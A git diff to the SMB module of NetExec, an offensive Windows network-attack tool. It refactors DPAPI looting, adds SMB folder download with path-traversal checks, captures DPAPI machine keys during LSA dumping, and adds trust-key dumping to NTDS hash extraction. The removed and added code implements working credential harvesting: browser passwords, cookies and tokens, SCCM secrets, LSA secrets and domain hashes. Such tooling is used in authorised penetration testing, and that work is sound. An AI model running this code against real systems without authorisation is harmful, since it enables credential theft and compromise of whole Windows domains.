@@ -4,6 +4,9 @@ import os
 import re
 import struct
 import ipaddress
+from pathlib import Path
+
+from nxc.helpers.path import sanitize_filename
 from Cryptodome.Hash import MD4
 from textwrap import dedent
 
@@ -42,24 +45,23 @@ from impacket.smb3structs import (
     FILE_ADD_SUBDIRECTORY,
     FILE_DIRECTORY_FILE,
     FILE_OPEN,
+    FILE_READ_DATA,
     FILE_SHARE_DELETE,
     FILE_SHARE_READ,
     FILE_SHARE_WRITE,
     FILE_SYNCHRONOUS_IO_NONALERT,
+    FILE_WRITE_DATA,
     GENERIC_WRITE,
     SMB2_0_IOCTL_IS_FSCTL,
     WRITE_DAC,
     WRITE_OWNER,
 )
-
 from impacket.dcerpc.v5 import tsts as TSTS
 
 from nxc.config import process_secret, host_info_colors, check_guest_account, display_dc
 from nxc.connection import connection, sem, requires_admin, dcom_FirewallChecker
 from nxc.helpers.misc import gen_random_string, validate_ntlm
 from nxc.logger import NXCAdapter
-from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
-from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
 from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket
 from nxc.protocols.smb.wmiexec import WMIEXEC
 from nxc.protocols.smb.atexec import TSCH_EXEC
@@ -72,17 +74,13 @@ from nxc.protocols.smb.samrfunc import SamrFunc
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.logger import highlight
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.dpapi import DPAPITriage
 from nxc.helpers.rpc import NXCRPCConnection
 from nxc.helpers.powershell import create_ps_command
 from nxc.helpers.misc import detect_if_ip
 from nxc.protocols.ldap.resolution import LDAPResolution
 
-from dploot.triage.vaults import VaultsTriage
-from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
-from dploot.triage.credentials import CredentialsTriage
-from dploot.triage.cng import CngTriage
-from dploot.lib.target import Target
-from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
+from dploot.lib.network.smb import SMBTarget as Target
 
 from time import time, ctime, sleep
 from traceback import format_exc
@@ -136,12 +134,12 @@ class smb(connection):
         self.nthash = ""
         self.remote_ops = None
         self.bootkey = None
+        self.dpapi_system_key = None
         self.smbv1 = None   # Check if SMBv1 is supported
         self.smbv3 = None   # Check if SMBv3 is supported
         self.is_timed_out = False
         self.signing = False
         self.smb_share_name = smb_share_name
-        self.pvkbytes = None
         self.no_da = None
         self.no_ntlm = False
         self.null_auth = False
@@ -150,6 +148,8 @@ class smb(connection):
         self.isdc = None
         self.tgt = None
         self.tgs = None
+
+        self._dpapi_triage = None
 
         connection.__init__(self, args, db, host)
 
@@ -319,7 +319,7 @@ class smb(connection):
         if not self.kdcHost and self.domain and self.domain == self.targetDomain:
             result = self.resolver(self.domain)
             self.kdcHost = result["host"] if result else None
-            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
+            self.logger.debug(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
 
     def print_host_info(self):
         signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=["bold"]) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=["bold"])
@@ -659,7 +659,7 @@ class smb(connection):
         return self.conn.isSigningRequired()
 
     def create_smbv1_conn(self, check=False):
-        self.logger.info(f"Creating SMBv1 connection to {self.host}")
+        self.logger.debug(f"Creating SMBv1 connection to {self.host}")
         try:
             conn = SMBConnection(
                 self.remoteName,
@@ -674,26 +674,26 @@ class smb(connection):
                 self.conn = conn
         except OSError as e:
             if "Connection reset by peer" in str(e):
-                self.logger.info(f"SMBv1 might be disabled on {self.host}")
+                self.logger.debug(f"SMBv1 might be disabled on {self.host}")
             elif "timed out" in str(e):
                 self.is_timed_out = True
                 self.logger.debug(f"Timeout creating SMBv1 connection to {self.host}")
             else:
-                self.logger.info(f"Error creating SMBv1 connection to {self.host}: {e}")
+                self.logger.debug(f"Error creating SMBv1 connection to {self.host}: {e}")
             self.smbv1 = False
             return False
         except NetBIOSError:
-            self.logger.info(f"SMBv1 disabled on {self.host}")
+            self.logger.debug(f"SMBv1 disabled on {self.host}")
             self.smbv1 = False
             return False
         except (Exception, NetBIOSTimeout) as e:
-            self.logger.info(f"Error creating SMBv1 connection to {self.host}: {e}")
+            self.logger.debug(f"Error creating SMBv1 connection to {self.host}: {e}")
             self.smbv1 = False
             return False
         return True
 
     def create_smbv3_conn(self):
-        self.logger.info(f"Creating SMBv3 connection to {self.host}")
+        self.logger.debug(f"Creating SMBv3 connection to {self.host}")
         try:
             self.conn = SMBConnection(
                 self.remoteName,
@@ -708,7 +708,7 @@ class smb(connection):
                 self.is_timed_out = True
                 self.logger.debug(f"Timeout creating SMBv3 connection to {self.host}")
             else:
-                self.logger.info(f"Error creating SMBv3 connection to {self.host}: {e}")
+                self.logger.debug(f"Error creating SMBv3 connection to {self.host}: {e}")
             self.smbv3 = False
             return False
         return True
@@ -2162,23 +2162,107 @@ class smb(connection):
         for src, dest in self.args.put_file:
             self.put_file_single(src, dest)
 
-    def get_file_single(self, remote_path, download_path):
+    def download_file(self, share_name, remote_path, dest_file, access_mode=FILE_READ_DATA):
+        try:
+            self.logger.debug(f"Getting file from {share_name}:{remote_path} with access mode {access_mode}")
+            self.conn.getFile(share_name, remote_path, dest_file, shareAccessMode=access_mode)
+            return True
+        except SessionError as e:
+            if "STATUS_SHARING_VIOLATION" in str(e):
+                self.logger.debug(f"Sharing violation on {remote_path}: {e}")
+            else:
+                self.logger.debug(f"SessionError when attempting to download file {remote_path}: {e}")
+            return False
+        except Exception as e:
+            self.logger.debug(f"Other error when attempting to download file {remote_path}: {e}")
+            return False
+
+    def get_file_single(self, remote_path, download_path, silent=False):
         share_name = self.args.share
-        self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
+        if not silent:
+            self.logger.display(f"Copying '{remote_path}' to '{download_path}'")
         if self.args.append_host:
             download_path = f"{self.hostname}-{remote_path}"
         with open(download_path, "wb+") as file:
-            try:
-                self.conn.getFile(share_name, remote_path, file.write)
-                self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
-            except Exception as e:
-                self.logger.fail(f'Error writing file "{remote_path}" from share "{share_name}": {e}')
-                if os.path.getsize(download_path) == 0:
-                    os.remove(download_path)
+            if self.download_file(share_name, remote_path, file.write):
+                if not silent:
+                    self.logger.success(f"File '{remote_path}' was downloaded to '{download_path}'")
+            else:
+                self.logger.debug("Opening with READ alone failed, trying to open file with READ/WRITE access")
+                if self.download_file(share_name, remote_path, file.write, FILE_READ_DATA | FILE_WRITE_DATA):
+                    if not silent:
+                        self.logger.success(f"File '{remote_path}' was downloaded to '{download_path}'")
+                else:
+                    if not silent:
+                        self.logger.fail(f"Error downloading file '{remote_path}' from share '{share_name}'")
 
     def get_file(self):
         for src, dest in self.args.get_file:
             self.get_file_single(src, dest)
+
+    def download_folder(self, folder, dest, recursive=False, silent=False, base_dir=None, ignore_empty=False):
+        folder = ntpath.normpath(folder)
+        self.logger.debug(f"Downloading folder with args: {folder}, {dest}, Recursive: {recursive}, Silent: {silent}, Base dir: {base_dir}, Ignore empty: {ignore_empty}")
+        base_folder = os.path.basename(folder)
+        self.logger.debug(f"Base folder: {base_folder}")
+
+        try:
+            items = self.conn.listPath(self.args.share, ntpath.join(folder, "*"))
+        except SessionError as e:
+            self.logger.error(f"Error listing folder '{folder}': {e}")
+            return
+        self.logger.debug(f"{len(items)} items in folder: {items}")
+
+        filtered_items = [item for item in items if item.get_longname() not in [".", ".."]]
+
+        # create local directory structure regardless of content; download empty folders by default
+        # change the Windows path to Linux and then join it with the base directory to get our actual save path
+        relative_path = os.path.join(*folder.replace(base_dir or folder, "").lstrip("\\").split("\\"))
+        local_folder_path = os.path.join(dest, relative_path)
+
+        if not filtered_items and ignore_empty:
+            self.logger.debug(f"Skipping empty folder '{folder}'")
+            return
+
+        # create the directory for this folder
+        os.makedirs(local_folder_path, exist_ok=True)
+        if not filtered_items and not silent:
+            self.logger.display(f"Created empty directory '{local_folder_path}'")
+
+        for item in filtered_items:
+            item_name = sanitize_filename(item.get_longname())
+            if not item_name:
+                self.logger.fail(f"Path traversal detected in '{item.get_longname()}', skipping")
+                continue
+            dir_path = ntpath.normpath(ntpath.join(folder, item_name))
+            self.logger.debug(f"Parsing item: {item_name}, {dir_path}")
+
+            if item.is_directory() and recursive:
+                self.logger.debug(f"Found new directory to parse: {dir_path}")
+                self.download_folder(dir_path, dest, recursive, silent, base_dir or folder, ignore_empty)
+            elif not item.is_directory():
+                remote_file_path = ntpath.join(folder, item_name)
+                local_file_path = os.path.join(local_folder_path, item_name)
+                # Defense-in-depth: verify path stays under destination
+                resolved = Path(local_file_path).resolve()
+                if not str(resolved).startswith(str(Path(dest).resolve()) + os.sep):
+                    self.logger.fail(f"Path traversal detected in '{item_name}', skipping")
+                    continue
+                self.logger.debug(f"{dest=} {remote_file_path=} {relative_path=} {local_folder_path=} {local_file_path=}")
+
+                try:
+                    self.get_file_single(remote_file_path, local_file_path, silent)
+                except FileNotFoundError:
+                    self.logger.fail(f"Error downloading file '{remote_file_path}' due to file not found (probably a race condition between listing and downloading)")
+
+    def get_folder(self):
+        recursive = self.args.recursive
+        ignore_empty = self.args.ignore_empty_folders
+        self.logger.debug(f"Recursive option set to {recursive}")
+        self.logger.debug(f"Ignore empty folders option set to {ignore_empty}")
+        for folder, dest in self.args.get_folder:
+            self.download_folder(folder, dest, recursive, self.args.silent, None, ignore_empty)
+            self.logger.success(f"Folder '{folder}' was downloaded to '{dest}'")
 
     def enable_remoteops(self, regsecret=False):
         try:
@@ -2253,255 +2337,32 @@ class smb(connection):
 
     @requires_admin
     def sccm(self):
-        target = Target.create(
-            domain=self.domain,
-            username=self.username,
-            password=self.password,
-            target=self.hostname + "." + self.domain if self.kerberos else self.host,
-            lmhash=self.lmhash,
-            nthash=self.nthash,
-            do_kerberos=self.kerberos,
-            kdcHost=self.kdcHost,
-            dc_ip=self.kdcHost,
-            aesKey=self.aesKey,
-            no_pass=True,
-            use_kcache=self.use_kcache,
-        )
-
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
-        if conn is None:
-            self.logger.debug("Could not upgrade connection")
-            return
-
-        masterkeys = collect_masterkeys_from_target(self, target, conn, user=False)
-
-        if len(masterkeys) == 0:
-            self.logger.fail("No masterkeys looted")
-            return
-
-        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
-
-        def sccm_callback(secret):
-            if isinstance(secret, SCCMCred):
-                tag = "NAA Account"
-                self.logger.highlight(f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    secret.username.decode("latin-1"),
-                    secret.password.decode("latin-1"),
-                    "N/A",
-                )
-            elif isinstance(secret, SCCMSecret):
-                tag = "Task sequences secret"
-                self.logger.highlight(f"[{tag}] {secret.secret.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    "N/A",
-                    secret.secret.decode("latin-1"),
-                    "N/A",
-                )
-            elif isinstance(secret, SCCMCollection):
-                tag = "Collection Variable"
-                self.logger.highlight(f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    secret.variable.decode("latin-1"),
-                    secret.value.decode("latin-1"),
-                    "N/A",
-                )
-        try:
-            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=sccm_callback)
-            sccm_triage.triage_sccm(use_wmi=self.args.sccm == "wmi", )
-        except Exception as e:
-            self.logger.debug(f"Error while looting sccm: {e}")
+        self.dpapi_triage.triage_sccm()
 
     @requires_admin
     def dpapi(self):
-        dump_system = "nosystem" not in self.args.dpapi
+        self.dpapi_triage.triage_dpapi()
 
-        if self.args.pvk is not None:
-            try:
-                with open(self.args.pvk, "rb") as f:
-                    self.pvkbytes = f.read()
-                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
-            except Exception as e:
-                self.logger.fail(str(e))
-
-        if self.pvkbytes is None:
-            self.pvkbytes = get_domain_backup_key(self)
-
+    @property
+    def dpapi_triage(self) -> DPAPITriage:
+        if self._dpapi_triage is not None:
+            return self._dpapi_triage
         target = Target.create(
             domain=self.domain,
             username=self.username,
             password=self.password,
-            target=self.remoteName,
+            address=self.remoteName,
             lmhash=self.lmhash,
             nthash=self.nthash,
             do_kerberos=self.kerberos,
             kdcHost=self.kdcHost,
             dc_ip=self.kdcHost,
             aesKey=self.aesKey,
-            no_pass=True,
             use_kcache=self.use_kcache,
         )
 
-        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # ruff: ignore[open-file-with-context-handler]
-
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
-        if conn is None:
-            self.logger.debug("Could not upgrade connection")
-            return
-
-        masterkeys = collect_masterkeys_from_target(self, target, conn, system=dump_system)
-
-        if len(masterkeys) == 0:
-            self.logger.fail("No masterkeys looted")
-            return
-
-        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
-
-        # Collect User and Machine Credentials Manager secrets
-        def credential_callback(credential):
-            tag = "CREDENTIAL"
-            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
-            self.logger.highlight(line)
-            if self.output_file:
-                self.output_file.write(line + "\n")
-            self.db.add_dpapi_secrets(
-                target.address,
-                tag,
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.target,
-            )
-
-        try:
-            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
-            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
-            credentials_triage.triage_credentials()
-            if dump_system:
-                credentials_triage.triage_system_credentials()
-        except Exception as e:
-            self.logger.debug(f"Error while looting credentials: {e}")
-
-        dump_cookies = "cookies" in self.args.dpapi
-
-        cng_chromekey = None
-        try:
-            cng_triage = CngTriage(target=target, conn=conn, masterkeys=masterkeys)
-            for cng_file in cng_triage.triage_system_cng():
-                if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
-                    self.logger.debug("Found CNG Google ChromeKey1\n")
-                    cng_chromekey = cng_file.decrypted_private_key
-        except Exception as e:
-            self.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
-
-        # Collect Chrome Based Browser stored secrets
-        def browser_callback(secret):
-            if isinstance(secret, LoginData):
-                secret_url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, GoogleRefreshToken):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.service,
-                    secret.token,
-                    "Google Refresh Token",
-                )
-            elif isinstance(secret, Cookie):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
-            browser_triage.triage_browsers(gather_cookies=dump_cookies, cng_chromekey=cng_chromekey)
-        except Exception as e:
-            self.logger.debug(f"Error while looting browsers: {e}")
-
-        def vault_callback(secret):
-            tag = "IEX"
-            if secret.type == "Internet Explorer":
-                resource = secret.resource + " -" if secret.resource != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.resource,
-                )
-
-        try:
-            # Collect User Internet Explorer stored secrets
-            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
-            vaults_triage.triage_vaults()
-        except Exception as e:
-            self.logger.debug(f"Error while looting vaults: {e}")
-
-        def firefox_callback(secret):
-            tag = "FIREFOX"
-            if isinstance(secret, FirefoxData):
-                url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, FirefoxCookie):
-                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            # Collect Firefox stored secrets
-            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn, per_secret_callback=firefox_callback)
-            firefox_triage.run(gather_cookies=dump_cookies)
-        except Exception as e:
-            self.logger.debug(f"Error while looting firefox: {e}")
-
-        if self.output_file:
-            self.output_file.close()
-            with open(self.output_file_template.format(output_folder="dpapi")) as f:
-                if sum(1 for _ in f) == 0:
-                    self.logger.fail("No dpapi loot retrieved")
+        self._dpapi_triage = DPAPITriage(self, target)
+        return self._dpapi_triage
 
     @requires_admin
     def list_snapshots(self):
@@ -2518,13 +2379,21 @@ class smb(connection):
             self.logger.highlight(f"{drive:<8}{i:<26}")
 
     @requires_admin
-    def lsa(self):
+    def lsa(self, quiet=False):
         try:
             self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
 
             def add_lsa_secret(secret):
                 add_lsa_secret.secrets += 1
-                self.logger.highlight(secret)
+                if "dpapi_machinekey" not in secret:
+                    if not quiet:
+                        self.logger.highlight(secret)
+                else:
+                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
+                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
+                    if not quiet:
+                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
+                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
                 if "_SC_GMSA_{84A78B8C" in secret:
                     gmsa_id = secret.split("_")[4].split(":")[0]
                     data = bytes.fromhex(secret.split("_")[4].split(":")[1])
@@ -2534,7 +2403,8 @@ class smb(connection):
                     ntlm_hash = MD4.new()
                     ntlm_hash.update(currentPassword)
                     passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
-                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+                    if not quiet:
+                        self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
 
             add_lsa_secret.secrets = 0
 
@@ -2554,13 +2424,15 @@ class smb(connection):
                         isRemote=True,
                         perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                     )
-                self.logger.display("Dumping LSA secrets")
+                if not quiet:
+                    self.logger.display("Dumping LSA secrets")
                 self.output_filename = self.output_file_template.format(output_folder="lsa")
                 LSA.dumpCachedHashes()
                 LSA.exportCached(self.output_filename)
                 LSA.dumpSecrets()
                 LSA.exportSecrets(self.output_filename)
-                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                if not quiet:
+                    self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
                 try:
                     self.remote_ops.finish()
                 except Exception as e:
@@ -2579,9 +2451,10 @@ class smb(connection):
         NTDSFileName = None
         host_id = self.db.get_hosts(filter_term=self.host)[0][0]
         printed_kerb_keys_banner = False
+        printed_trust_keys_banner = False
 
         def add_hash(secret_type, secret, host_id):
-            nonlocal printed_kerb_keys_banner
+            nonlocal printed_kerb_keys_banner, printed_trust_keys_banner
             if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                 self.logger.display("Kerberos keys:")
                 printed_kerb_keys_banner = True
@@ -2592,13 +2465,15 @@ class smb(connection):
             else:
                 add_hash.nt_lm_secrets += 1
 
-            # Log the secret based on args
-            if self.args.enabled:
-                if "Enabled" in secret:
-                    secret = " ".join(secret.split(" ")[:-1])
-                    self.logger.highlight(secret)
-            else:
-                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
+            is_enabled_account = secret.endswith(" (status=Enabled)")
+            is_trust_key = " (Incoming" in secret or " (Outgoing" in secret
+            for status in (" (status=Enabled)", " (status=Disabled)", " (status=N/A)"):
+                secret = secret.removesuffix(status)
+
+            if not self.args.enabled or is_enabled_account or is_trust_key:
+                if is_trust_key and not printed_trust_keys_banner:
+                    self.logger.display("Trust keys:")
+                    printed_trust_keys_banner = True
                 self.logger.highlight(secret)
 
             # Filter out computer accounts, history hashes and kerberos keys for adding to db
@@ -2650,18 +2525,27 @@ class smb(connection):
             outputFileName=self.output_filename,
             justUser=self.args.userntds if self.args.userntds else None,
             printUserStatus=True,
+            trustKeys=self.args.trust_keys,
+            justTrustKeys=self.args.just_trust_keys,
+            domainFQDN=self.targetDomain,
             perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
         )
 
         try:
-            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+            if self.args.just_trust_keys:
+                self.logger.success("Dumping the trust keys, this could take a while so go grab a redbull...")
+            else:
+                self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
             NTDS.dump()
             ntds_outfile = f"{self.output_filename}.ntds"
-            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
-            if self.args.kerberos_keys:
-                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
-            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
-            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+            if self.args.just_trust_keys:
+                self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} trust keys to {ntds_outfile}.trustkeys")
+            else:
+                self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+                if self.args.kerberos_keys:
+                    self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+                self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+                self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
         except Exception as e:
             # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
             # We don't store the resume file if this error happened, since this error is related to lack
